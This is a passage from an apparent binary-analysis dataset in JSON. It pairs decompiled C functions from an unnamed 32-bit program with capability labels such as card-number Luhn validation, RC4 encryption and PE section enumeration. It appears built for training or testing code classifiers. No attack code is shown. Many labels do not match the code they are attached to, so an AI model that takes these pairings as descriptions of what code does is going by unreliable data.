        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.000519b0(uint arg_8h, uint arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    int32_t arg_8h_00;\n    code *pcVar1;\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    while (var_4h < arg_14h) {\n        arg_8h_00 = *(arg_10h + var_4h * 4);\n        fcn.00053020(arg_8h_00);\n        var_4h = arg_8h_00 + 1;\n    }\n    pcVar1 = fcn.00063f30(arg_8h);\n    (*pcVar1)(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 204
    },
    "00052080": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00052080(uint noname_0, int32_t arg_ch, uint arg_10h)\n\n{\n    *(arg_ch + 0x1c + *(arg_ch + 0x1e)) = arg_10h;\n    fcn.00034570(arg_ch + 0x3c);\n    if (*(arg_ch + 0x38) == 0x70724152) {\n        fcn.00050920(arg_ch);\n    }\n    return;\n}\n",
        "token_count": 108
    },
    "00052d30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00052d30(int32_t arg_8h, int32_t arg_ch, uint noname_2, uint arg_14h)\n\n{\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = arg_8h;\n    var_4h = *(arg_ch + 0x40);\n    if (*0x10 != 0x14) {\n        if ((*(var_4h + 6) & 5) == 0) {\n            var_1ch = (**0x80051230)(var_4h, 0);\n        }\n        else {\n            var_1ch = *(var_4h + 0xc);\n        }\n        var_10h = var_1ch;\n    }\n    var_ch = *(var_4h + 0x14);\n    fcn.00051a00(arg_ch, 0, 0, &var_14h, &var_18h);\n    fcn.00052c90(*(var_8h + 4), var_10h, var_ch, var_10h + var_ch, arg_14h);\n    (**0x80051060)(arg_ch);\n    (**0x800512a4)(var_4h);\n    (**0x800512a4)(var_14h);\n    fcn.000357f0(var_10h);\n    return;\n}\n",
        "token_count": 351
    },
    "00053350": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00053350(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00035150();\n    if (iVar1 < 0x1b) {\n        fcn.000357f0(arg_8h);\n    }\n    else {\n        fcn.00045940(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 85
    },
    "000574b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000574b0(int32_t arg_8h)\n\n{\n    *(arg_8h * 0x3c + -0x7ff35450) = *(arg_8h * 0x3c + -0x7ff35450) + 1;\n    return;\n}\n",
        "token_count": 70
    },
    "000574e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000574e0(int32_t arg_8h)\n\n{\n    *(arg_8h * 0x3c + -0x7ff3544c) = *(arg_8h * 0x3c + -0x7ff3544c) + 1;\n    return;\n}\n",
        "token_count": 72
    },
    "000577f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000577f0(uint noname_0, uint noname_1, uint arg_10h, uint *arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t var_94h;\n    uint var_90h;\n    uint *var_8ch;\n    uint var_88h;\n    uint var_80h;\n    uint *var_7ch;\n    uint var_78h;\n    uint var_70h;\n    uint *var_6ch;\n    uint var_68h;\n    uint var_60h;\n    uint *var_5ch;\n    uint var_58h;\n    uint var_50h;\n    uint *var_4ch;\n    uint var_48h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint *var_14h;\n    uint var_10h;\n    uint *var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    *arg_14h = 0;\n    if (*0x800ce963 == '\\0') {\n        uVar1 = 0x21590006;\n    }\n    else {\n        iVar2 = fcn.00020a80(arg_10h, 0x58, 3, &var_94h, 4);\n        if (iVar2 == 0) {\n            var_94h = 0;\n        }\n        *arg_14h = 3;\n        var_10h = 5;\n        var_ch = &var_3ch;\n        var_3ch = 0x2a;\n        var_38h = 2;\n        var_34h = 0x2b;\n        var_30h = 2;\n        var_2ch = 0x2c;\n        var_28h = 2;\n        var_24h = 0x2d;\n        var_20h = 2;\n        var_1ch = 0x2e;\n        var_18h = 2;\n        var_14h = &var_90h;\n        var_8h = 1;\n        var_4h = &var_14h;\n        fcn.00078bfa(&var_90h, 0, 0x50);\n        var_8ch = &var_88h;\n        var_90h = 4;\n        var_88h = *(var_94h * 0x3c + -0x7ff35450);\n        var_7ch = &var_78h;\n        var_80h = 4;\n        var_78h = *(var_94h * 0x3c + -0x7ff3544c);\n        var_6ch = &var_68h;\n        var_70h = 4;\n        var_68h = *(var_94h * 0x3c + -0x7ff35448);\n        var_5ch = &var_58h;\n        var_60h = 4;\n        var_58h = *(var_94h * 0x3c + -0x7ff35444);\n        var_4ch = &var_48h;\n        var_50h = 4;\n        var_48h = *(var_94h * 0x3c + -0x7ff35440);\n        uVar1 = fcn.0002f2c0(&var_10h, arg_18h, arg_1ch);\n    }\n    return uVar1;\n}\n",
        "token_count": 846
    },
    "0005b750": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0005b750(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t var_4h;\n    \n    if (arg_8h % arg_ch == 0) {\n        var_4h = arg_8h;\n    }\n    else {\n        var_4h = (arg_8h / arg_ch + 1) * arg_ch;\n    }\n    return var_4h;\n}\n",
        "token_count": 101
    },
    "000603e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000603e0(int32_t arg_8h)\n\n{\n    *(arg_8h + 0x100) = 0;\n    *(arg_8h + 0x102) = 0;\n    *(arg_8h + 0x103) = 0;\n    *(arg_8h + 0x104) = 0;\n    *(arg_8h + 0x105) = 0;\n    *(arg_8h + 0x108) = 0;\n    *(arg_8h + 0x106) = 0;\n    *(arg_8h + 0x102) = 0;\n    *(arg_8h + 0x101) = 0;\n    *(arg_8h + 0x109) = 0;\n    *(arg_8h + 0x9c) = 0x24c;\n    *(arg_8h + 0x98) = 0;\n    *(arg_8h + 0xa0) = 0;\n    *(arg_8h + 0xa4) = 0;\n    *(arg_8h + 0xa8) = 0;\n    *(arg_8h + 0xac) = 0;\n    *(arg_8h + 0xb0) = 0;\n    *(arg_8h + 0xb4) = 0;\n    *(arg_8h + 0xb8) = 0;\n    *(arg_8h + 0xbc) = 0;\n    *(arg_8h + 0xc0) = 0;\n    *(arg_8h + 0xc4) = 0;\n    *(arg_8h + 200) = 0;\n    *(arg_8h + 0xcc) = 0;\n    *(arg_8h + 0xd0) = 0;\n    *(arg_8h + 0xd4) = 0;\n    *(arg_8h + 0xd8) = 0;\n    *(arg_8h + 0xdc) = 0;\n    *(arg_8h + 0xe0) = 0;\n    *(arg_8h + 0xe4) = 0;\n    *(arg_8h + 0xe8) = 0;\n    *(arg_8h + 0xec) = 0;\n    *(arg_8h + 0xf0) = 0;\n    *(arg_8h + 0xf4) = 0;\n    *(arg_8h + 0xf8) = 0;\n    *(arg_8h + 0xfc) = 0;\n    return;\n}\n",
        "token_count": 596
    },
    "00060ca0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint32_t __cdecl fcn.00060ca0(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    uint var_1h;\n    \n    if (*(arg_8h + 0x10) < *(arg_8h + 0x14)) {\n        uVar1 = **(arg_8h + 0x10);\n        *(arg_8h + 0x10) = *(arg_8h + 0x10) + 1;\n    }\n    else {\n        uVar1 = 0xffffffff;\n    }\n    return uVar1;\n}\n",
        "token_count": 148
    },
    "00060ce0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00060ce0(uint *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    *arg_8h = 0x800a0ca0;\n    arg_8h[4] = arg_ch;\n    arg_8h[5] = arg_ch + arg_10h;\n    *(arg_8h + 1) = 0;\n    *(arg_8h + 5) = 0;\n    *(arg_8h + 3) = 0;\n    return;\n}\n",
        "token_count": 124
    },
    "000610a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000610a0(int32_t arg_8h)\n\n{\n    fcn.00078bfa(arg_8h, 0, 600);\n    fcn.00061140(arg_8h, 0x10);\n    *(arg_8h + 0x9c) = 0x215;\n    fcn.00061180(arg_8h, 0, 0);\n    return;\n}\n",
        "token_count": 97
    },
    "000611c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000611c0(int32_t arg_8h)\n\n{\n    return arg_8h + 0x212;\n}\n",
        "token_count": 35
    },
    "00061c80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00061c80(uint *arg_8h, uint *arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = *arg_ch;\n    uVar2 = *arg_8h;\n    uVar3 = fcn.0001afc0(uVar2, uVar1, (-(arg_10h != 0) & 0xfffffffe) + 2, arg_14h);\n    *arg_8h = uVar2;\n    *arg_ch = uVar1;\n    return uVar3;\n}\n",
        "token_count": 168
    },
    "00061e80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00061e80(void)\n\n{\n    fcn.000357f0(*0x800da9ac);\n    *0x800da9ac = 0;\n    return;\n}\n",
        "token_count": 44
    },
    "00061ec0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00061ec0(void)\n\n{\n    fcn.000357f0(*0x800da9ac);\n    fcn.000357f0(*0x800da9a8);\n    return;\n}\n",
        "token_count": 49
    },
    "00066980": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00066980(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_88h;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = arg_ch;\n    while (iVar1 = fcn.00078140(&var_4h, &var_88h, 0x80, &var_8h),  iVar1 != 0) {\n        iVar1 = fcn.00078a92(&var_88h, 0x80055854);\n        if (iVar1 == 0) {\n            uVar2 = fcn.00037a10(var_8h, arg_8h + 0x134);\n            *(arg_8h + 0x130) = uVar2;\n        }\n        else {\n            iVar1 = fcn.00078a92(&var_88h, 0x8005585c);\n            if (iVar1 == 0) {\n                uVar2 = fcn.00036370(var_8h, 0, 0);\n                *(arg_8h + 0x13c) = uVar2;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 280
    },
    "000670a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000670a0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    iVar1 = fcn.00037a70(arg_8h + 0x134, &var_10h);\n    if (iVar1 != 0) {\n        fcn.00066a20(arg_8h, var_ch, var_8h, 0);\n        fcn.000357f0(var_ch);\n    }\n    return;\n}\n",
        "token_count": 125
    },
    "00067310": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00067310(int32_t arg_8h)\n\n{\n    fcn.000761d0(arg_8h + 4, 0);\n    fcn.000761d0(arg_8h + 8, 0);\n    return;\n}\n",
        "token_count": 61
    },
    "00067640": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00067640(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint uVar1;\n    uint var_4h;\n    \n    fcn.00034a10(arg_8h + 0x14);\n    uVar1 = fcn.00067690(arg_8h, 0, 0, arg_ch, arg_10h, arg_14h, arg_18h);\n    fcn.00034a80(arg_8h + 0x14);\n    return uVar1;\n}\n",
        "token_count": 138
    },
    "00067e60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00067e60(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    \n    var_9ch = arg_ch;\n    var_98h = arg_10h;\n    var_94h = arg_14h;\n    var_a0h = 0;\n    fcn.00078460(arg_8h + 0x92, &var_90h);\n    fcn.00067fc0(arg_8h, &var_a0h, &var_90h);\n    return;\n}\n",
        "token_count": 164
    },
    "00067f60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00067f60(int32_t arg_8h, uint arg_ch)\n\n{\n    uint var_90h;\n    \n    fcn.00078460(arg_8h + 0x92, &var_90h);\n    fcn.00067fc0(arg_8h, arg_ch, &var_90h);\n    return;\n}\n",
        "token_count": 81
    },
    "00068380": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00068380(uint noname_0, uint arg_ch)\n\n{\n    fcn.000357f0(arg_ch);\n    return;\n}\n",
        "token_count": 36
    },
    "0006ad40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0006ad40(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t var_4h;\n    \n    *(arg_8h + 0x24) = 1;\n    fcn.00034a10(arg_8h + 0x130);\n    for (var_4h = 0; var_4h < 0xb; var_4h = var_4h + 1) {\n        fcn.000761d0(arg_8h + 0x34 + var_4h * 0x18, 1);\n    }\n    fcn.000761d0(arg_8h + 0x14, 0);\n    for (var_4h = 0; var_4h < 0xb; var_4h = var_4h + 1) {\n        iVar1 = fcn.00037730(arg_8h + 0x2c + var_4h * 0x18);\n        if (iVar1 != 0) {\n            fcn.00037760(arg_8h + 0x2c + var_4h * 0x18, 0);\n            fcn.00037710(arg_8h + 0x2c + var_4h * 0x18);\n            *(arg_8h + 0x28 + var_4h * 0x18) = 3;\n        }\n    }\n    fcn.00034a80(arg_8h + 0x130);\n    return;\n}\n",
        "token_count": 361
    },
    "0006ae20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0006ae20(int32_t arg_8h)\n\n{\n    fcn.000349e0(arg_8h + 0x130);\n    fcn.000349e0(arg_8h + 0x18);\n    fcn.000357f0(arg_8h);\n    return;\n}\n",
        "token_count": 73
    },
    "0006af20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_90h\n\nvoid __cdecl fcn.0006af20(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint *var_90h;\n    char *var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = arg_8h;\n    var_4h = arg_ch;\n    while( true ) {\n        var_90h = &var_4h;\n        iVar1 = fcn.00078140(var_90h, &var_90h, 0x80, &var_ch);\n        if (iVar1 == 0) break;\n        iVar1 = fcn.00078a92(&var_90h, 0x80055898);\n        if ((iVar1 == 0) && ((iVar1 = fcn.000364a0(*var_ch),  iVar1 == 0x59 || (*var_ch == '1')))) {\n            *(var_8h + 0x148) = 1;\n        }\n        else {\n            iVar1 = fcn.00078a92(&var_90h, 0x800558a8);\n            if ((iVar1 == 0) && ((iVar1 = fcn.000364a0(*var_ch),  iVar1 == 0x59 || (*var_ch == '1')))) {\n                *(var_8h + 0x14c) = 1;\n            }\n        }\n    }\n    fcn.000766e0(*(arg_8h + 0x14), arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 373
    },
    "0006bbe0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0006bbe0(int32_t arg_8h)\n\n{\n    int32_t var_4h;\n    \n    for (var_4h = 0; var_4h < *(arg_8h + 0xb8); var_4h = var_4h + 1) {\n        fcn.000357f0(*(arg_8h + 0x1c + var_4h * 0x10));\n    }\n    return;\n}\n",
        "token_count": 107
    },
    "0006c300": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0006c300(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_4h;\n    \n    fcn.00036ed0(0x800cdb00);\n    uVar1 = fcn.00036320(&var_4h);\n    fcn.00078bb8(uVar1);\n    iVar2 = fcn.000344b0(0x800cdafc);\n    if (iVar2 == 0) {\n        fcn.00036f40(0x800cdb00);\n        uVar1 = 0;\n    }\n    else {\n        iVar2 = fcn.0001ace0(0x800cdaf4, 0x800acff0, 0);\n        if (iVar2 == 0) {\n            *0x800da9c8 = 1;\n            uVar1 = 1;\n        }\n        else {\n            fcn.00036f40(0x800cdb00);\n            fcn.00034540(0x800cdafc);\n            uVar1 = 0;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 247
    },
    "0006d3e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0006d3e0(int32_t arg_8h)\n\n{\n    fcn.00073fa0(arg_8h + 4, 0);\n    return;\n}\n",
        "token_count": 45
    },
    "0006d400": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0006d400(int32_t arg_8h)\n\n{\n    fcn.000349e0(arg_8h + 8);\n    fcn.000357f0(arg_8h);\n    return;\n}\n",
        "token_count": 53
    },
    "0006d4f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_88h\n\nvoid __cdecl fcn.0006d4f0(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint *var_88h;\n    char *var_8h;\n    uint var_4h;\n    \n    var_4h = arg_ch;\n    while( true ) {\n        var_88h = &var_4h;\n        iVar1 = fcn.00078140(var_88h, &var_88h, 0x80, &var_8h);\n        if (iVar1 == 0) break;\n        iVar1 = fcn.00078a92(&var_88h, 0x800558e8);\n        if ((iVar1 == 0) && ((*var_8h == '1' || (iVar1 = fcn.000364a0(*var_8h),  iVar1 == 0x59)))) {\n            *(arg_8h + 0x10) = 1;\n        }\n    }\n    fcn.00074490(*(arg_8h + 4), arg_ch, 0);\n    return;\n}\n",
        "token_count": 261
    },
    "0006ecc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0006ecc0(int32_t arg_8h)\n\n{\n    fcn.000349e0(arg_8h + 0x28);\n    fcn.000357f0(arg_8h);\n    return;\n}\n",
        "token_count": 55
    },
    "0006ee00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_88h\n\nvoid __cdecl fcn.0006ee00(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint *var_88h;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = arg_ch;\n    while( true ) {\n        var_88h = &var_4h;\n        iVar1 = fcn.00078140(var_88h, &var_88h, 0x80, &var_8h);\n        if (iVar1 == 0) break;\n        iVar1 = fcn.00078a92(&var_88h, 0x80055900);\n        if (iVar1 == 0) {\n            *(arg_8h + 0xc) = 0;\n            *(arg_8h + 0x10) = 0;\n            *(arg_8h + 0x14) = 0;\n            *(arg_8h + 0x18) = 0;\n            fcn.00078ac8(arg_8h + 0xc, var_8h, 0x10);\n        }\n        else {\n            iVar1 = fcn.00078a92(&var_88h, 0x80055904);\n            if (iVar1 == 0) {\n                *(arg_8h + 0xc) = 0;\n                *(arg_8h + 0x10) = 0;\n                *(arg_8h + 0x14) = 0;\n                *(arg_8h + 0x18) = 0;\n                fcn.00078ac8(arg_8h + 0xc, var_8h, 0x10);\n                *(arg_8h + 0x2c) = 1;\n            }\n        }\n    }\n    fcn.000766e0(*(arg_8h + 4), arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 451
    },
    "0006fb30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0006fb30(int32_t arg_8h, uint arg_ch)\n\n{\n    fcn.000761d0(arg_8h + 4, arg_ch);\n    return;\n}\n",
        "token_count": 47
    },
    "00072550": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00072550(int32_t arg_8h)\n\n{\n    fcn.00034540(arg_8h + 0x54);\n    fcn.000349e0(arg_8h + 0x48);\n    fcn.000349e0(arg_8h + 0x1c);\n    fcn.000349e0(arg_8h + 0x18);\n    fcn.000357f0(arg_8h);\n    return;\n}\n",
        "token_count": 108
    },
    "00073a20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00073a20(uint *arg_8h)\n\n{\n    *arg_8h = 0;\n    arg_8h[1] = 0;\n    arg_8h[2] = 0;\n    arg_8h[3] = 0;\n    arg_8h[4] = 0;\n    fcn.000326e0(arg_8h + 4);\n    fcn.000344b0(arg_8h + 3);\n    return;\n}\n",
        "token_count": 113
    },
    "00077850": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00077850(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.00077f10(arg_8h);\n    if (iVar1 == 0) {\n        uVar2 = *(*arg_8h + 0x14);\n        fcn.00037020(*arg_8h + 4);\n    }\n    else {\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 128
    },
    "00077ed0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00077ed0(int32_t **arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00077f10(arg_8h);\n    if (iVar1 == 0) {\n        (**(**arg_8h + 0x40))(arg_8h, arg_ch);\n        fcn.00037020(*arg_8h + 1);\n    }\n    return;\n}\n",
        "token_count": 102
    },
    "000784d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000784d0(uint *arg_8h, uint *arg_ch)\n\n{\n    *arg_8h = 1;\n    *(arg_8h + 1) = 0xe;\n    *(arg_8h + 6) = 2;\n    arg_8h[2] = 0;\n    arg_8h[3] = 0;\n    arg_8h[4] = 0;\n    *(arg_8h + 5) = 0;\n    *arg_ch = 0x16;\n    return;\n}\n",
        "token_count": 127
    },
    "00060d20": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00060d20(int32_t arg_8h)\n\n{\n    uint var_4h;\n    \n    if ((*(arg_8h + 4) == *(arg_8h + 5)) && (*(arg_8h + 0x18) != '\\0')) {\n        var_4h = 1;\n    }\n    else {\n        var_4h = 0;\n    }\n    return var_4h;\n}\n",
        "token_count": 100
    },
    "00060f50": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nulong __cdecl fcn.00060f50(uint arg_8h)\n\n{\n    uchar uVar1;\n    uint32_t uVar2;\n    ulong uVar3;\n    ulong uVar4;\n    ulong uVar5;\n    ulong uVar6;\n    ulong uVar7;\n    ulong uVar8;\n    ulong uVar9;\n    uint uVar10;\n    uint uVar11;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar11 = arg_8h;\n    uVar2 = fcn.00060d60(arg_8h);\n    uVar10 = arg_8h;\n    uVar1 = fcn.00060d60(arg_8h);\n    uVar3 = fcn.00078c06(uVar10, uVar11, uVar1, 0);\n    fcn.00060d60(arg_8h);\n    uVar4 = fcn.00078c06();\n    fcn.00060d60(arg_8h);\n    uVar5 = fcn.00078c06();\n    fcn.00060d60(arg_8h);\n    uVar6 = fcn.00078c06();\n    fcn.00060d60(arg_8h);\n    uVar7 = fcn.00078c06();\n    fcn.00060d60(arg_8h);\n    uVar8 = fcn.00078c06();\n    fcn.00060d60(arg_8h);\n    uVar9 = fcn.00078c06();\n    return CONCAT44(uVar9 >> 0x20 |\n                    uVar8 >> 0x20 | uVar7 >> 0x20 | uVar6 >> 0x20 | uVar5 >> 0x20 | uVar4 >> 0x20 | uVar3 >> 0x20, \n                    uVar9 | uVar8 | uVar7 | uVar6 | uVar5 | uVar4 | uVar3 | uVar2 & 0xff);\n}\n",
        "token_count": 487
    },
    "00061ad0": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00061ad0(int32_t arg_8h)\n\n{\n    fcn.00060d60(arg_8h);\n    if (*(arg_8h + 0x112 + *(arg_8h + 4)) == '\\x0f') {\n        fcn.000615b0(arg_8h);\n    }\n    else {\n        fcn.000613f0(arg_8h);\n    }\n    *(arg_8h + 0x9c) = **(arg_8h + 0x98);\n    return;\n}\n",
        "token_count": 125
    },
    "0001aa60": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0001aa60(uint noname_0, int32_t arg_ch)\n\n{\n    uint uVar1;\n    uint var_4h;\n    \n    uVar1 = (**(arg_ch + 0x10))(*(arg_ch + 0x14));\n    *(arg_ch + 0x18) = uVar1;\n    (**0x800510c4)(arg_ch, 0, 0);\n    return;\n}\n",
        "token_count": 99
    },
    "0001a8c0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0001a8c0(uint32_t *arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = *arg_8h;\n    while( true ) {\n        LOCK();\n        if (uVar1 == *arg_8h) break;\n        uVar1 = *arg_8h;\n    }\n    *arg_8h = uVar1 & arg_ch;\n    return;\n}\n",
        "token_count": 104
    },
    "0001ade0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0001ade0(void)\n\n{\n    int32_t iVar1;\n    \n    fcn.00037400(0x800ce38c);\n    do {\n        iVar1 = fcn.000533b0(0x800ce388, 1, 1);\n    } while (iVar1 == 0);\n    fcn.00037420(0x800ce38c);\n    return;\n}\n",
        "token_count": 91
    },
    "00026f80": {
        "rules": [
            "contain loop"
        ],
